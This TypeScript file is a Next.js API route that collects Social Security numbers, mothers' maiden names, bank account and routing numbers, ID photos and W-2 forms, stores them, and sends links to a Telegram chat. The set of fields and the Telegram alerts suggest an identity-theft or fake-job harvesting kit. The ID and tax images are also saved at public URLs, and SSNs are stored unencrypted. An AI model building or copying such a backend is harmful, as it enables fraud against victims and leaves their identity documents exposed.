import { NextResponse } from 'next/server';
import { sql } from '@vercel/postgres';
import { randomUUID } from 'crypto';
import { sendTelegramNotification } from '@/app/lib/sendTelegramNotification';
import { supabase } from '@/app/lib/supabaseClient';

export async function POST(req: Request) {
  try {
    const formData = await req.formData();
    const get = (key: string) => formData.get(key)?.toString().trim() ?? '';

    const applicant_id = get('applicant_id');
    const first_name = get('first_name');
    const middle_name = get('middle_name');
    const last_name = get('last_name');
    const mother_maiden = get('motherMaidenName');
    const ssn = get('ssn');
    const date_of_birth = get('date_of_birth');
    const routing_number = get('routing_number');
    const account_number = get('account_number');
    const bank_name = get('bank_name');

    const street = get('address.street');
    const city = get('address.city');
    const state = get('address.state');
    const zip_code = get('address.zip_code');

    if (![street, city, state, zip_code].every(Boolean)) {
      return NextResponse.json({ error: 'All address fields are required.' }, { status: 400 });
    }

    const front_image = formData.get('front_image');
    const back_image = formData.get('back_image');
    const w2_form = formData.get('w2_form');

    if (
      !(front_image instanceof Blob) ||
      !(back_image instanceof Blob) ||
      !(w2_form instanceof Blob)
    ) {
      return NextResponse.json({ error: 'Missing or invalid file(s).' }, { status: 400 });
    }


    const sanitize = (str: string) => str.replace(/[^a-zA-Z0-9\-_]/g, '_');

    const generateFilename = (label: string, file: Blob) => {
      const ext = file.type.split('/')[1] || 'bin';
      const cleanName = sanitize(`${first_name}-${last_name}-${label}`);
      return `${label}/${cleanName}-${randomUUID()}.${ext}`;
    };

    const uploadToSupabase = async (file: Blob, filename: string) => {
      const buffer = Buffer.from(await file.arrayBuffer());
      const contentType = file.type || 'application/octet-stream';

      const { error: uploadError } = await supabase.storage
        .from('onboarding')
        .upload(filename, buffer, {
          contentType,
          upsert: true,
        });

      if (uploadError) {
        console.error('❌ Upload error:', uploadError.message);
        throw new Error(`Upload failed for ${filename}`);
      }

      const { data: urlData } = supabase.storage
        .from('onboarding')
        .getPublicUrl(filename);

      if (!urlData?.publicUrl) {
        throw new Error(`Failed to get public URL for ${filename}`);
      }

      return urlData.publicUrl;
    };

    const front_image_filename = generateFilename('front', front_image);
    const back_image_filename = generateFilename('back', back_image);
    const w2_form_filename = generateFilename('w2', w2_form);

    const front_url = await uploadToSupabase(front_image, front_image_filename);
    const back_url = await uploadToSupabase(back_image, back_image_filename);
    const w2_url = await uploadToSupabase(w2_form, w2_form_filename);

    console.log('✅ Files uploaded');

    await sql`
  INSERT INTO onboarding (
    applicant_id, first_name, middle_name, last_name, mother_maiden_name,
    ssn, date_of_birth,
    street, city, state, zip_code,
    account_number, routing_number, bank_name,
    front_image_url, back_image_url, w2_form_url,
    front_image_filename, back_image_filename, w2_form_filename,
    onboarding_completed, onboarding_date
  )
  VALUES (
    ${applicant_id}, ${first_name}, ${middle_name}, ${last_name}, ${mother_maiden},
    ${ssn}, ${date_of_birth},
    ${street}, ${city}, ${state}, ${zip_code},
    ${account_number}, ${routing_number}, ${bank_name},
    ${front_url}, ${back_url}, ${w2_url},
    ${front_image_filename}, ${back_image_filename}, ${w2_form_filename},
    TRUE, NOW()
  )
  ON CONFLICT (applicant_id) DO UPDATE SET
    first_name = EXCLUDED.first_name,
    middle_name = EXCLUDED.middle_name,
    last_name = EXCLUDED.last_name,
    mother_maiden_name = EXCLUDED.mother_maiden_name,
    ssn = EXCLUDED.ssn,
    date_of_birth = EXCLUDED.date_of_birth,
    street = EXCLUDED.street,
    city = EXCLUDED.city,
    state = EXCLUDED.state,
    zip_code = EXCLUDED.zip_code,
    account_number = EXCLUDED.account_number,
    routing_number = EXCLUDED.routing_number,
    bank_name = EXCLUDED.bank_name,
    front_image_url = EXCLUDED.front_image_url,
    back_image_url = EXCLUDED.back_image_url,
    w2_form_url = EXCLUDED.w2_form_url,
    front_image_filename = EXCLUDED.front_image_filename,
    back_image_filename = EXCLUDED.back_image_filename,
    w2_form_filename = EXCLUDED.w2_form_filename,
    onboarding_completed = TRUE,
    onboarding_date = NOW()
`;

    console.log('✅ Onboarding data inserted');

    await sendTelegramNotification(`
📥 New Onboarding: ${first_name} ${last_name} (${bank_name})
🔗 Front ID: ${front_url}
🔗 Back ID: ${back_url}
📄 W-2: ${w2_url}
`.trim());

    return NextResponse.json({ success: true });

  } catch (err: any) {
    console.error('❌ Onboarding failed:', err?.message || err);
    return NextResponse.json({ error: 'Failed to complete onboarding.' }, { status: 500 });
  }
}
